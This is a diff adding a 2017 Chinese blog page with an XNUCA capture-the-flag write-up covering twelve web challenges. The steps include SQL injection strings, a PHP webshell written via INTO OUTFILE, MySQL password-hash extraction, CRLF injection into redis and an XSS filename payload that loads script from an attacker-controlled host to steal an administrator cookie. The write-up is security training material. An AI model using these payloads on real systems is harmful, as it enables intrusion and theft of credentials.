@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Shinpachi8" />
+
+
+
+<meta name="description" content="write-up
+说来很尴尬，这个CTF自己并没有做出来多少。只不过是写出来自己总结一下经验
+
+放一个详细的write-up合天官方write-up
+Q1 BaseCoding
+这个题自己解出来了，很简单的一个编码题
+
+
+题目：BaseCoding
+
+write-up:访问页面，得到了base64编码的flag信息，base64解码即可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Xnuca">
+<meta property="og:url" content="http://yoursite.com/2017/01/19/xnuca/index.html">
+<meta property="og:site_name" content="shin's blog">
+<meta property="og:description" content="write-up
+说来很尴尬，这个CTF自己并没有做出来多少。只不过是写出来自己总结一下经验
+
+放一个详细的write-up合天官方write-up
+Q1 BaseCoding
+这个题自己解出来了，很简单的一个编码题
+
+
+题目：BaseCoding
+
+write-up:访问页面，得到了base64编码的flag信息，base64解码即可">
+<meta property="og:updated_time" content="2017-01-19T03:03:40.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Xnuca">
+<meta name="twitter:description" content="write-up
+说来很尴尬，这个CTF自己并没有做出来多少。只不过是写出来自己总结一下经验
+
+放一个详细的write-up合天官方write-up
+Q1 BaseCoding
+这个题自己解出来了，很简单的一个编码题
+
+
+题目：BaseCoding
+
+write-up:访问页面，得到了base64编码的flag信息，base64解码即可">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="shin&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>Xnuca | shin&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/assets/img/shinpachi.JPG" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Shinpachi8</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">远看泰山黑乎乎</p>
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                            <li><a href="/friendlink/">友链</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web安全/">web安全</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Shinpachi8</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/assets/img/shinpachi.JPG" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Shinpachi8</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">远看泰山黑乎乎</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                    <li><a href="/friendlink/">友链</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-xnuca" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/01/19/xnuca/" class="article-date">
+      <time datetime="2017-01-19T03:02:37.000Z" itemprop="datePublished">2017-01-19</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Xnuca
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h1 id="write-up"><a href="#write-up" class="headerlink" title="write-up"></a>write-up</h1><blockquote>
+<p>说来很尴尬，这个CTF自己并没有做出来多少。<br>只不过是写出来自己总结一下经验</p>
+</blockquote>
+<p>放一个详细的<a href="https://www.ohlinge.cn/ctf/xnuca_ctf_writeup.html" target="_blank" rel="external">write-up</a><br><a href="http://bbs.heetian.com/forum.php?mod=forumdisplay&amp;fid=44" target="_blank" rel="external">合天官方write-up</a></p>
+<h2 id="Q1-BaseCoding"><a href="#Q1-BaseCoding" class="headerlink" title="Q1 BaseCoding"></a>Q1 BaseCoding</h2><blockquote>
+<p>这个题自己解出来了，很简单的一个编码题</p>
+</blockquote>
+<ul>
+<li><p>题目：<br><a href="http://question1.erangelab.com/" target="_blank" rel="external">BaseCoding</a></p>
+</li>
+<li><p>write-up:<br>访问页面，得到了base64编码的flag信息，base64解码即可</p>
+</li>
+</ul>
+<a id="more"></a>
+<h2 id="Q2-BaseInjection"><a href="#Q2-BaseInjection" class="headerlink" title="Q2 BaseInjection"></a>Q2 BaseInjection</h2><blockquote>
+<p>这个也比较容易，是一个SQL注入的问题，两个框都用<code>&#39; or &#39;1&#39;=&#39;1</code> 来试一下</p>
+</blockquote>
+<ul>
+<li><p>题目：<br><a href="http://question2.erangelab.com/" target="_blank" rel="external">BaseInjection</a></p>
+</li>
+<li><p>write-up：<br>对两个输入框分别尝试万能的<code>&#39; or &#39;1&#39;=&#39;1</code> ，在尝试密码框的时候成功了。</p>
+</li>
+</ul>
+<h2 id="Q3-BaseReconstruction"><a href="#Q3-BaseReconstruction" class="headerlink" title="Q3 BaseReconstruction"></a>Q3 BaseReconstruction</h2><blockquote>
+<p>info: 看似和上题一样，其实不然</p>
+</blockquote>
+<ul>
+<li><p>题目：<br><a href="http://question3.erangelab.com/" target="_blank" rel="external">BaseReconstruction</a></p>
+</li>
+<li><p>write-up：<br>本地JS做了过滤，所以抓包(fiddler, burpsuite)来修改请求为<code>&#39; or &#39;1&#39;=&#39;1</code></p>
+</li>
+</ul>
+<h2 id="Q4-CountingStars"><a href="#Q4-CountingStars" class="headerlink" title="Q4 CountingStars"></a>Q4 CountingStars</h2><blockquote>
+<p>这个题对我来说好坑，只怪自己不够猥琐，没有多方面考虑<br>info: no more $s, counting stars</p>
+</blockquote>
+<ul>
+<li><p>题目：<br><a href="http://question4.erangelab.com" target="_blank" rel="external">CountingStars</a></p>
+</li>
+<li><p>write-up：<br>先吐槽一句，这个脑洞太大，也怪自己不够猥琐，还得学习呀。 其实并不是解密题。</p>
+<ol>
+<li><a href="http://www.zhihu.com/question/20345704" target="_blank" rel="external">.DS_Store</a>文件信息泄露，下载分析得到一个压缩包</li>
+<li>解压为index.php的源码</li>
+<li>重定向到index.php之前查看抓到的包，可以看到flag</li>
+</ol>
+</li>
+</ul>
+<h2 id="Q5-Invisible"><a href="#Q5-Invisible" class="headerlink" title="Q5 Invisible"></a>Q5 Invisible</h2><blockquote>
+<p>这个也解出来了，简单的修改头部变量</p>
+</blockquote>
+<ul>
+<li><p>题目：<br><a href="http://question5.erangelab.com" target="_blank" rel="external">Invisible</a></p>
+</li>
+<li><p>write-up：</p>
+<ol>
+<li>查看源代码，发现<code>index.php.bak</code></li>
+<li>base64解码</li>
+<li>考查点为<a href="http://blog.163.com/youismiling@126/blog/static/103240067201163081952125/" target="_blank" rel="external">HTTP请求头</a>中关于IP的问题</li>
+<li>直接添加头部，或者用其他的方法隐藏IP</li>
+</ol>
+</li>
+</ul>
+<h2 id="Q6-Normal-normal"><a href="#Q6-Normal-normal" class="headerlink" title="Q6 Normal_normal"></a>Q6 Normal_normal</h2><blockquote>
+<p>info: 又是一个bbs，然而并没有做出来</p>
+</blockquote>
+<ul>
+<li><p>题目：<br><a href="http://question6.erangelab.com" target="_blank" rel="external">Normal_normal</a></p>
+</li>
+<li><p>write-up：</p>
+<ol>
+<li>根据网站的风格以及CSS文件的注释，CMS是phpwind，而不是phpbbb(真心不知道..)</li>
+<li>发现zhangrendao的邮箱信息，公开的社工库查询到邮箱密码</li>
+<li>进入<code>admin.php</code>管理后台</li>
+<li>在自定义HTML中可以插入php代码</li>
+<li>调用模块，即可获得flag</li>
+</ol>
+</li>
+</ul>
+<h2 id="Q7-NDBexplorer"><a href="#Q7-NDBexplorer" class="headerlink" title="Q7 NDBexplorer"></a>Q7 NDBexplorer</h2><blockquote>
+<p>提到就想跪，就是这个，刚刚看到<code>db.php.swp</code>的文件，接着服务器就被日穿了….</p>
+</blockquote>
+<ul>
+<li><p>题目：<br><a href="http://question7.erangelab.com" target="_blank" rel="external">NDBexplorer</a></p>
+</li>
+<li><p>write-up：</p>
+<ol>
+<li>站点.db.php.swp泄露了mysql配置信息，但是ctfdb用户的权限不足，无法用<br><code>select&#39;&lt;?php@eval($_POST[-77]);?&gt;&#39;INTO OUTFILE &#39;/var/www/html/errors.php&#39;</code></li>
+<li>而flag存在另外一个flag数据库，.db.php.swp可看到phpMyAdmin；</li>
+<li>正确思路是使用ctfdb用户通过phpMyAdmin连接数据库，查看数据库数据存放路径：<code>SELECT @@datadir</code>；</li>
+<li>创建一张表，然后使用load data infile，加载mysql下的用户口令文件user.MYD到这张表中，命令如下：<br><code>loaddata infile &quot;/var/lib/mysql/mysql/user.MYD&quot; into TABLE test.q fields terminated by &#39;&#39; LINES TERMINATED BY &#39;\0&#39;</code>;</li>
+<li>然后查看导进去的内容，得到root、ctfdb、topsec、top用户的密码哈希值sha1；</li>
+<li>其中root不大可能跑出来，但topsec这个用户的密码可以跑出来topsec123456；</li>
+<li>最后用跑出来的用户名密码连接数据库，最后翻出flag。</li>
+</ol>
+</li>
+</ul>
+<h2 id="Q8-RotatePicture"><a href="#Q8-RotatePicture" class="headerlink" title="Q8 RotatePicture"></a>Q8 RotatePicture</h2><blockquote>
+<p>这个题看过了，但是没有解出来… ORZ</p>
+</blockquote>
+<ul>
+<li><p>题目：<br><a href="http://question8.erangelab.com" target="_blank" rel="external">RotatePicture</a></p>
+</li>
+<li><p>write-up：</p>
+<ol>
+<li>根据网站的功能，推断后端脚本使用了urlopen等类似函数进行了网络请求。</li>
+<li>urlopen支持file schema，因此可以输入file://localhost/filename形式的参数进行本地文件读取，尝试输入file://localhost/etc/hosts,可显示该文件部分信息。</li>
+<li>根据html注释的提示，输入file://localhost/home/www/ctf/app/views.py，获得下一步提示，网站存在另外一个页面/getredisvalue</li>
+<li>新页面需要输入key并从redis中读出对应的value，如果存在则返回flag。</li>
+<li>结合redis和第一个页面的urlopen，想到使用urlopen的缺陷进行header攻击。返回前一个页面，输入<a href="http://127.0.0.1%0d%0aSET%20d4c5428c-f43c-4bae-9269-493e9cc593d6%20bar%0d%0aSAVE%0d%0a:6379/foo，此时会在redis中写入相应键值。" target="_blank" rel="external">http://127.0.0.1%0d%0aSET%20d4c5428c-f43c-4bae-9269-493e9cc593d6%20bar%0d%0aSAVE%0d%0a:6379/foo，此时会在redis中写入相应键值。</a><br>回到第二个页面，输入key：d4c5428c-f43c-4bae-9269-493e9cc593d6可以获得flag</li>
+</ol>
+</li>
+</ul>
+<h2 id="Q9-AdminLogin"><a href="#Q9-AdminLogin" class="headerlink" title="Q9 AdminLogin"></a>Q9 AdminLogin</h2><blockquote>
+<p>这个看到了…当时毫无思路</p>
+</blockquote>
+<ul>
+<li><p>题目：<br><a href="http://question9.erangelab.com" target="_blank" rel="external">AdminLogin</a></p>
+</li>
+<li><p>write-up：</p>
+<ol>
+<li>直接打开news.php显示”where r u come from?”，从index.php的链接跳转到news.php可显示rules；</li>
+<li>news.php可进行sql注入，但是需要在header中添加Referer=<a href="http://xxx/index.php" target="_blank" rel="external">http://xxx/index.php</a> （包含index.php即可）；</li>
+<li>注入获取用户名ctfadmin及密码a2224f1bf263d26bab1994723f7565a3，爆破md5，最终结果为administrat0r；</li>
+<li>接下来找登录地址，正确思路是根目录有robots.txt（防止蜘蛛文件），可发现后台路径/xnucactfwebadmin/；</li>
+<li>然后有.svn文件泄露，可在xnucactfwebadmin根目录找着.svn/entries，从而发现与后台登录地址/welcometoctfloginxxx.php；</li>
+<li>要求X-Forwarded-For设置为8.8.8.8才能登录成功；</li>
+<li>登录校验页面logincheck.php登录成功后输出echo <code>&quot;&lt;script&gt;alert(&#39;Successful login,Congratulations..&#39;);window.location.href=&#39;index.php&#39;;&lt;/script&gt;&quot;</code>;</li>
+<li>flag以<code>&lt;!-- &lt;imgsrc=&quot;data:image/png;base64,iVBORw0KGgo=...&quot; /&gt; --&gt;</code>形式写在logincheck.php；</li>
+<li>想办法阻止window.location.href=’index.php’，最简单办法是调整IE安全级别；</li>
+<li>在welcometoctfloginxxx.php页面找到一个img，图片为base64编码，还原图片获得flag{xxxxxx}。</li>
+</ol>
+</li>
+</ul>
+<h2 id="Q10-WeirdCamel"><a href="#Q10-WeirdCamel" class="headerlink" title="Q10 WeirdCamel"></a>Q10 WeirdCamel</h2><blockquote>
+<p>同样的一脸懵逼…<br>info: 欢迎报名夏令营，请您仔细阅读公告，之后我们将会审核您的报名信息。</p>
+</blockquote>
+<ul>
+<li><p>题目：<br><a href="http://question10.erangelab.com" target="_blank" rel="external">WeirdCamel</a></p>
+</li>
+<li><p>write-up：</p>
+<ol>
+<li>初始页面为活动报名页面，需要填写“姓名”,“电话”，“邮箱”进行报名</li>
+<li>页面会将信息以POST方式发送到<code>/cgi-bin/register.pl</code>，参数为：<br><code>name=alice&amp;phone=123456&amp;email=123@123.com</code><br>页面注释提示文件<code>/file/statement.txt</code>,访问后得到公告的文本信息</li>
+<li><p>后台处理流程为：<br>Perl CGI接受参数组成hash:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">%info=&#123;“STATEMENT” =&gt;”../file/statement.txt”,</div><div class="line"></div><div class="line">     &quot;NAME&quot;=&gt; $input-&gt;param(&apos;name&apos;),</div><div class="line">     &quot;PHONE&quot; =&gt;$input-&gt;param(&apos;phone&apos;),</div><div class="line">     &quot;EMAIL&quot; =&gt; $input-&gt;param(&apos;email&apos;),</div><div class="line">    &#125;;</div></pre></td></tr></table></figure>
+<p>之后将信息返回到页面中</p>
+</li>
+<li>返回信息中含有“STATEMENT”,与第二步中文件内容一致，猜到可能会有文件包含<br>在页面中以类似HASH的形式给出，提示答题者内容存放在HASH变量中</li>
+<li><p>利用Perl变量特性改造参数为：<br><code>name=alice&amp;name=STATEMENT&amp;name=../cgi-bin/register.pl</code><br>此时name参数被定义为数组，HASH中值为数组时会改变结构，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">%info=&#123;“STATEMENT” =&gt;”../file/statement.txt”,</div><div class="line"></div><div class="line">    &quot;NAME&quot; =&gt; （&quot;alice&quot;,&quot;STATEMENT&quot;,，&quot;../cgi-bin/register.pl&quot;）,</div><div class="line">    &quot;PHONE&quot; =&gt;$input-&gt;param(&apos;phone&apos;),</div><div class="line">    &quot;EMAIL&quot; =&gt; $input-&gt;param(&apos;email&apos;),</div><div class="line">    &#125;;</div></pre></td></tr></table></figure>
+<p>实际上为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">%info=&#123;“STATEMENT” =&gt;”../file/statement.txt”,</div><div class="line"></div><div class="line">     &quot;NAME&quot; =&gt; &quot;alice&quot;,</div><div class="line">     &quot;STATEMENT&quot; =&gt;&quot;../cgi-bin/register.pl&quot;,</div><div class="line">     &quot;PHONE&quot; =&gt;$input-&gt;param(&apos;phone&apos;),</div><div class="line">    &quot;EMAIL&quot; =&gt; $input-&gt;param(&apos;email&apos;),</div><div class="line">     &#125;;</div></pre></td></tr></table></figure>
+<p>“STATEMENT”被覆盖，从而能够读取register.pl的源码</p>
+</li>
+<li><p>源码中注释看到另一个页面<code>xnuca_looktheregisternews.pl?id=1</code>,访问后显示一条新闻，想到注入</p>
+</li>
+<li>PerlCGI会对单引号自动转义为\’，因此需要寻找突破口</li>
+<li>当参数为<code>id=1&amp;id=2</code>时，转义就会失效，可以进行手工注入</li>
+<li>猜测当前表为news，注入查看列个数<br>/cgi-bin/xnuca_looktheregisternews.pl?id=1and 1=2 union select 1,2,3（试到3时出现结果，因此有三列） from news&amp;id=2</li>
+<li>注入查看数据库，发现存在<code>xnuca_flag_db</code>数据库<br><code>/cgi-bin/xnuca_looktheregisternews.pl?id=1and 1=2 union select 1,2,SCHEMA_NAME from information_schema.SCHEMATA&amp;id=2</code></li>
+<li>注入查看表，发现存在<code>xnuca_flag_tab</code>表<br><code>/cgi-bin/xnuca_looktheregisternews.pl?id=1%20and%201=2%20union%20select%201,table_name,table_schema%20from%20information_schema.tables&amp;id=2</code></li>
+<li>注入查看列，发现只有一列flag<br><code>/cgi-bin/xnuca_looktheregisternews.pl?id=1%20and%201=2%20union%20select%201,COLUMN_NAME,TABLE_NAME%20from%20information_schema.COLUMNS&amp;id=2</code></li>
+<li>注入得到flag{xxxxxx}<br><code>id=1 and 1=2 union select 1,2,flag from xnuca_flag_db.xnuca_flag_tab&amp;id=2</code></li>
+</ol>
+</li>
+</ul>
+<h2 id="Q11-OneWayIn"><a href="#Q11-OneWayIn" class="headerlink" title="Q11 OneWayIn"></a>Q11 OneWayIn</h2><blockquote>
+<p>这个没见过，后边的也没有见</p>
+</blockquote>
+<ul>
+<li><p>题目：<br><a href="http://question11.erangelab.com" target="_blank" rel="external">OneWayIn</a></p>
+</li>
+<li><p>write-up：</p>
+<ol>
+<li>index.php登录页面泄露部分源码；</li>
+<li>想办法绕过<code>crc32($_POST[&#39;0_username&#39;]) ===crc32($_POST[&#39;0_pwd&#39;])</code>；</li>
+<li>php的crc32函数在处理数组时直接返回null，可提交：<br><code>0_username[]=111&amp;0_pwd[]=222&amp;submit=Submit</code>；</li>
+<li>登录后地址后被重定向，得到一堆字符，字符无用；</li>
+<li>重定向之后的url为<code>http://IP/flag_manager/index.php?file=dGVzdC50eHQ=&amp;num=</code></li>
+<li><code>file=dGVzdC50eHQ=</code>解码后得到<code>file=test.txt</code>,猜测存在文件包含漏洞；</li>
+<li>更改参数file的值为index.php的base64编码，得到空白页面；</li>
+<li>更改num参数为1后得到一行代码，同理，得到index.php的全部18行代码；</li>
+<li>发现页面读取flag,php，但需要cookie为<code>role_cookie=flagadmin</code>；</li>
+<li>将5中的参数file值修改为flag.php的base64编码，并在请求中添加cookie，根据8得到flag.php的源码；</li>
+<li>flag.php源码被加密，本地搭建环境执行得到提示<br><code>ADwAcwBjAHIAaQBwAHQAPgBmAGwAYQBnAHsATAB6AFUAVgB6AEQATwBvAHgAeQBlAG4AYwA4AHAAagBUADkAdwBlAG8AUgB1AE4ATgBJAE8ATQA0AGIAUQAyAH0APAAvAHMAYwByAGkAcAB0AD4</code></li>
+<li>通过ADwAcw识别为utf-7编码，界面得到flag为：<br><code>&lt;script&gt;flag{LzUVzDOoxyenc8pjT9weoRuNNIOM4bQ2}&lt;/script&gt;</code></li>
+</ol>
+</li>
+</ul>
+<h2 id="Q12-HelloBoss"><a href="#Q12-HelloBoss" class="headerlink" title="Q12 HelloBoss"></a>Q12 HelloBoss</h2><blockquote>
+<p>没见过</p>
+</blockquote>
+<ul>
+<li><p>题目：<br><a href="http://question12.erangelab.com" target="_blank" rel="external">HelloBoss</a></p>
+</li>
+<li><p>write-up：</p>
+<ol>
+<li>访问题目地址得到系统登录页面，发现用户名和MD5运算后的密码被POST到login.php</li>
+<li>直接访问login.php提示登录失败，尝试文件名后加“~”发现源码泄露login.php~。但login.php~并非源码，仅给答题者提示：用户名为editor，密码MD5开头为0e</li>
+<li>此时将POST请求进行改包，将密码改为数字0，即可绕过后端验证。原理是PHP认为0==”以0e开头后边全为数字”（科学计数法）</li>
+<li>登录成功后页面从manage.php重定向到upload.php，可以上传文件，但只允许上传doc文件。上传成功后会提示管理员会定期查看，想到利用文件名xss。此时cookie为role= 6704940cdd9b9d906229c2510400fb77，想到获取管理员的cookie</li>
+<li><p>构造xss文件名，但windows下对文件名限制较严格，且windows和linux下文件名中都无法使用“/”，对xss的payload构造增加了难度。<br>一个可执行的测试payload为（答题者需在linux下，并使用firefox）:<br><code>&lt;img src=x onerror=alert(&#39;123&#39;)&gt;.doc</code><br>一个可执行的最终Payload为（答题者需在linux下，并使用firefox）:<br><code>&lt;img src=x onerror=&quot;javascript:var xx=String.fromCharCode(47);document.body.appendChild(document.createElement(&#39;script&#39;)).id=&#39;tt&#39;;tt.src=&#39;http:&#39;+xx+xx+&#39;192.168.164.132&#39;+xx+&#39;cook.js&#39;;&quot;&gt;.doc</code><br>其中，192.168.164.132为答题者xss接收cooke的管理平台地址</p>
+</li>
+<li><p>最终得到管理员的cookie为：<br><code>xt=urn:btih:1207054EE7FBB53FF0708BDE6A7934B7E5095CC9</code><br>根据cookie格式可想到此为magnet链接，完整为：<br><code>magnet:?xt=urn:btih:1207054EE7FBB53FF0708BDE6A7934B7E5095CC9</code>，但无法下载<br>想到将链接转化成种子。网站<a href="http://www.torrent.org.cn/可以将磁力链转换成种子" target="_blank" rel="external">http://www.torrent.org.cn/可以将磁力链转换成种子</a><br>转换为.torrent文件后，使用下载工具打开可发现文件名为flag</p>
+</li>
+</ol>
+</li>
+</ul>
+<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
+<li>1个base64的题，不算是什么难度，base64的特征比较明显，包含+ =</li>
+<li>包含多个sql注入， 其中一个无过滤，一个本地过滤，还有几个考了<code>information_schema</code>表的内容，这一块也不太熟，需要再google一下,还有<code>load data infile ** into</code> 与 <code>select * from user into outfile &quot;xx\xxx&quot; fields terminated by &#39;,&#39; lines terminated by &#39;\n&#39;</code>读写文件操作，还可以用hex来绕过一些过滤</li>
+<li>还有的是备份文件包括 .DS_Store, xxx.php.swp, xxx.php~, .svn/entries, .git/</li>
+<li>urlopen 类似的网络请求函数，也支持file:// 这种本地协议，估计也支持ftp协议等</li>
+<li>php 的 0e123 的比较，具体来说，就是弱类型的比较，如 array在和string做strcmp()比较时，会返回null，%00 是截断</li>
+<li>pl 的格式</li>
+<li>sql防护的绕过，如id=1&amp;id=2, 参数污染</li>
+<li>radis的简单应用</li>
+</ol>
+<h1 id="需要学习的地方"><a href="#需要学习的地方" class="headerlink" title="需要学习的地方"></a>需要学习的地方</h1><ol>
+<li>radis的增删改查</li>
+<li>开脑洞</li>
+<li>永远需要学习</li>
+</ol>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/01/19/xnuca/">Xnuca</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Shinpachi8</a></p>
+        <p><span>发布时间:</span>2017-01-19, 11:02:37</p>
+        <p><span>最后更新:</span>2017-01-19, 11:03:40</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/01/19/xnuca/" title="Xnuca">http://yoursite.com/2017/01/19/xnuca/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/01/19/xnuca/　　作者: Shinpachi8" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/01/18/xxe漏洞及xxe练习/">
+                    Xxe漏洞及xxe练习
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#write-up"><span class="toc-number">1.</span> <span class="toc-text">write-up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Q1-BaseCoding"><span class="toc-number">1.1.</span> <span class="toc-text">Q1 BaseCoding</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q2-BaseInjection"><span class="toc-number">1.2.</span> <span class="toc-text">Q2 BaseInjection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q3-BaseReconstruction"><span class="toc-number">1.3.</span> <span class="toc-text">Q3 BaseReconstruction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q4-CountingStars"><span class="toc-number">1.4.</span> <span class="toc-text">Q4 CountingStars</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Q5-Invisible"><span class="toc-number">1.5.</span> <span class="toc-text">Q5 Invisible</span></a></li><li class="toc-item 